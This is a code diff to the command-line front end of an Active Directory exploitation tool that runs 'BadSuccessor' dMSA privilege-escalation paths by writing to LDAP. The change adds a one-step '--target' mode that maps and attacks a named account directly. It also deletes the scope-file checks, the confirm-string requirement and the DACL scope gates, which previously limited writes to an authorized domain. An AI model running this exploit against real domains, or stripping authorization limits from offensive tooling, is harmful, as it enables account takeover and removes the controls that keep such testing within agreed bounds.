@@ -40,7 +40,6 @@ app = typer.Typer(
     no_args_is_help=True,
 )
 
-_DACL_PRIMITIVES = frozenset({"dacl-container-escalate", "dacl-target-escalate"})
 _LEGACY_PRIMITIVES = frozenset({"legacy-oneway-link", "existing-dmsa-legacy-link"})
 _CREATE_CHILD_RIGHTS = frozenset({"CreateChild", "CreateChild:dMSA", "GenericAll"})
 _DACL_CONTROL_RIGHTS = frozenset({"WriteDACL", "GenericAll"})
@@ -320,6 +319,39 @@ def _make_ldap_config(
     )
 
 
+def _exact_target_filter(target: str) -> str:
+    """Build an LDAP filter that matches exactly one account by SID, DN, or sAMAccountName."""
+    from ldap3.utils.conv import escape_filter_chars
+
+    escaped = escape_filter_chars(target)
+    if target.upper().startswith("S-1-"):
+        return f"(objectSid={escaped})"
+    if "," in target and "=" in target:
+        return f"(distinguishedName={escaped})"
+    return f"(sAMAccountName={escaped})"
+
+
+def _apply_legacy_filter(
+    paths: list[PathCandidate],
+    state: MapState,
+    *,
+    legacy: bool,
+) -> list[PathCandidate]:
+    """Drop pre-patch/indirect paths unless --legacy is set, matching 'paths' defaults."""
+    if legacy:
+        return paths
+    has_postpatch_target = any(
+        _POSTPATCH_TARGET_ATTRS.issubset(set(target.writable_attrs))
+        for target in state.targets
+    )
+    return [
+        path
+        for path in paths
+        if path.primitive not in _LEGACY_PRIMITIVES
+        and (path.primitive != "dacl-container-escalate" or has_postpatch_target)
+    ]
+
+
 def _select_path(state: MapState, path_id: str) -> PathCandidate:
     paths = rank_paths(classify_paths(state, expand_targets=True))
     selected = next((path for path in paths if path.id == path_id), None)
@@ -340,7 +372,6 @@ def _populate_operation(
     dmsa_name: str | None,
     target_writable_attrs: list[str] | None,
     allow_broad_dacl: bool,
-    scope_allow_broad_dacl: bool,
     dc_host: str | None,
     dc_ip: str | None,
 ) -> None:
@@ -359,7 +390,6 @@ def _populate_operation(
         operation.metadata["target_writable_attrs"] = target_writable_attrs
     if allow_broad_dacl:
         operation.metadata["allow_broad_dacl"] = True
-        operation.metadata["scope_allow_broad_dacl"] = scope_allow_broad_dacl
     if operation.primitive == "existing-dmsa-legacy-link":
         operation.metadata["allow_existing_dmsa_legacy_link"] = True
 
@@ -481,15 +511,7 @@ def map_cmd(
             "Kerberos mapping requires --username for SID and group resolution"
         )
     if target:
-        from ldap3.utils.conv import escape_filter_chars
-
-        escaped = escape_filter_chars(target)
-        if target.upper().startswith("S-1-"):
-            exact_filter = f"(objectSid={escaped})"
-        elif "," in target and "=" in target:
-            exact_filter = f"(distinguishedName={escaped})"
-        else:
-            exact_filter = f"(sAMAccountName={escaped})"
+        exact_filter = _exact_target_filter(target)
         target_filter = (
             f"(&{target_filter}{exact_filter})"
             if target_filter
@@ -547,20 +569,7 @@ def paths_cmd(
     """List ranked, executable BadSuccessor paths."""
     state = MapState.load(state_path)
     paths = rank_paths(classify_paths(state, expand_targets=True))
-    if not legacy:
-        has_postpatch_target = any(
-            _POSTPATCH_TARGET_ATTRS.issubset(set(target.writable_attrs))
-            for target in state.targets
-        )
-        paths = [
-            path
-            for path in paths
-            if path.primitive not in _LEGACY_PRIMITIVES
-            and (
-                path.primitive != "dacl-container-escalate"
-                or has_postpatch_target
-            )
-        ]
+    paths = _apply_legacy_filter(paths, state, legacy=legacy)
     if only:
         wanted = set(only)
         paths = [path for path in paths if path.primitive in wanted]
@@ -575,12 +584,32 @@ def paths_cmd(
 
 @app.command("exploit")
 def exploit_cmd(
-    path_id: str = typer.Option(..., "--path", help="Path ID from the paths command."),
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    scope_file: Path = typer.Option(
-        ...,
-        "--scope",
-        help="JSON scope restricting LDAP writes.",
+    target: Optional[str] = typer.Option(
+        None,
+        "--target",
+        help="Account to attack: sAMAccountName, SID, or DN. Maps and selects "
+        "live, without a separate map/paths step.",
+    ),
+    path_id: Optional[str] = typer.Option(
+        None,
+        "--path",
+        help="Path ID. Required with --state; with --target, narrows a "
+        "multi-candidate result.",
+    ),
+    state_path: Optional[Path] = typer.Option(
+        None,
+        "--state",
+        help="Map state produced by the map command (used without --target).",
+    ),
+    primitive_filter: Optional[str] = typer.Option(
+        None,
+        "--primitive",
+        help="With --target, restrict discovery to one primitive.",
+    ),
+    legacy: bool = typer.Option(
+        False,
+        "--legacy",
+        help="With --target, also consider pre-patch one-way-link paths.",
     ),
     confirm: bool = typer.Option(
         False,
@@ -591,11 +620,6 @@ def exploit_cmd(
         False,
         "--dry-run",
         help="Print the planned LDAP writes.",
-    ),
-    confirm_string: Optional[str] = typer.Option(
-        None,
-        "--confirm-string",
-        help="Scope domain when required by the scope file.",
     ),
     domain: Optional[str] = typer.Option(None, "--domain", "-d"),
     dc_ip: Optional[str] = _OPT_DC_IP,
@@ -608,12 +632,12 @@ def exploit_cmd(
     target_dn: Optional[str] = typer.Option(
         None,
         "--target-dn",
-        help="Target account DN for a path that requires one.",
+        help="Target account DN override for a path that requires one.",
     ),
     container_dn: Optional[str] = typer.Option(
         None,
         "--container-dn",
-        help="Container for dMSA creation when the path does not supply one.",
+        help="Container for dMSA creation, or to disambiguate a --target search.",
     ),
     chain: Optional[str] = typer.Option(
         None,
@@ -628,7 +652,7 @@ def exploit_cmd(
     allow_broad_dacl: bool = typer.Option(
         False,
         "--allow-broad-dacl",
-        help="Use broad ACEs when schema GUIDs are unavailable; scope must allow it.",
+        help="Use broad ACEs when schema GUIDs are unavailable.",
     ),
     cleanup_policy: str = typer.Option(
         "on-failure",
@@ -638,33 +662,70 @@ def exploit_cmd(
     ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
     json_out: Optional[Path] = typer.Option(None, "--json"),
 ) -> None:
-    """Preview or execute one mapped path."""
+    """Preview or execute one path.
+
+    Use --target to map and exploit a single account directly. Use
+    --state/--path after a separate 'map' + 'paths' run.
+    """
     if confirm == dry_run:
         raise typer.BadParameter("choose exactly one of --confirm or --dry-run")
     if cleanup_policy not in {"on-failure", "manual"}:
         raise typer.BadParameter("--cleanup-policy must be on-failure or manual")
+    if target and state_path:
+        raise typer.BadParameter("choose --target or --state, not both")
+    if not target and not path_id:
+        raise typer.BadParameter("--path is required unless --target is given")
 
     configure_ops_dir(ops_dir)
-    state = MapState.load(state_path)
-    selected = _select_path(state, path_id)
-    if not selected.executable:
-        raise typer.BadParameter(f"path is not executable: {path_id}")
+    direct_target_dn: str | None = None
 
-    from dmsa_reaper.scope import (
-        check_dacl_scope_gates,
-        check_domain_match,
-        load_scope,
-    )
-
-    scope, scope_hash = load_scope(scope_file)
-    try:
-        check_domain_match(state.environment.domain, scope)
-    except ValueError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-    if confirm and scope.require_confirm_string and confirm_string != scope.domain:
-        raise typer.BadParameter(
-            f"--confirm-string must exactly match {scope.domain!r}"
+    if target:
+        effective_domain = domain or ""
+        if not effective_domain and not dc_ip and not dc_host:
+            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
+        state = run_live_map(
+            _make_ldap_config(
+                effective_domain,
+                dc_ip,
+                dc_host,
+                username,
+                password,
+                kerberos,
+                use_ldaps,
+                start_tls,
+            ),
+            sdflags=DEFAULT_SD_FLAGS,
+            target_filter=_exact_target_filter(target),
         )
+        if not state.targets:
+            raise typer.BadParameter(f"target not found: {target}")
+        direct_target_dn = state.targets[0].dn
+
+        candidates = [p for p in rank_paths(classify_paths(state, expand_targets=True)) if p.executable]
+        candidates = _apply_legacy_filter(candidates, state, legacy=legacy)
+        if primitive_filter:
+            candidates = [p for p in candidates if p.primitive == primitive_filter]
+        if container_dn:
+            candidates = [
+                p for p in candidates if (p.container_dn or "").lower() == container_dn.lower()
+            ]
+        if path_id:
+            candidates = [p for p in candidates if p.id == path_id]
+
+        if len(candidates) != 1:
+            print_paths(candidates)
+            if not candidates:
+                raise typer.BadParameter(f"no executable path found for target {target!r}")
+            raise typer.BadParameter(
+                f"{len(candidates)} executable paths found for {target!r}; "
+                "narrow with --path, --primitive, or --container-dn"
+            )
+        selected = candidates[0]
+    else:
+        state = MapState.load(state_path or Path("state.json"))
+        selected = _select_path(state, path_id)
+        if not selected.executable:
+            raise typer.BadParameter(f"path is not executable: {path_id}")
 
     primitive = get_primitives().get(selected.primitive)
     if primitive is None or not primitive.check(selected):
@@ -672,7 +733,7 @@ def exploit_cmd(
             f"no executor is available for {selected.primitive}"
         )
 
-    effective_target = target_dn or selected.target_dn
+    effective_target = target_dn or selected.target_dn or direct_target_dn
     effective_container = container_dn or selected.container_dn
     if selected.requires_operator_target and not effective_target:
         raise typer.BadParameter("--target-dn is required for this path")
@@ -685,15 +746,6 @@ def exploit_cmd(
             )
     elif chain is not None:
         raise typer.BadParameter("--chain is only valid for dacl-container-escalate")
-
-    if primitive.name in _DACL_PRIMITIVES:
-        try:
-            check_dacl_scope_gates(
-                scope,
-                broad_requested=allow_broad_dacl,
-            )
-        except ValueError as exc:
-            raise typer.BadParameter(str(exc)) from exc
 
     writable_attrs = _target_writable_attrs(
         state,
@@ -746,7 +798,6 @@ def exploit_cmd(
             *selected.environment_warnings,
             *primitive.preflight(
                 selected,
-                scope=scope,
                 target_dn=effective_target,
                 container_dn=effective_container,
             ),
@@ -772,7 +823,6 @@ def exploit_cmd(
             dmsa_name=dmsa_name,
             target_writable_attrs=writable_attrs,
             allow_broad_dacl=allow_broad_dacl,
-            scope_allow_broad_dacl=scope.allow_broad_dacl,
             dc_host=dc_host,
             dc_ip=dc_ip,
         )
@@ -826,7 +876,6 @@ def exploit_cmd(
     )
 
     operation = primitive.plan(selected)
-    operation.scope_file_hash = scope_hash
     _populate_operation(
         operation,
         state=state,
@@ -836,7 +885,6 @@ def exploit_cmd(
         dmsa_name=dmsa_name,
         target_writable_attrs=writable_attrs,
         allow_broad_dacl=allow_broad_dacl,
-        scope_allow_broad_dacl=scope.allow_broad_dacl,
         dc_host=dc_host,
         dc_ip=dc_ip,
     )
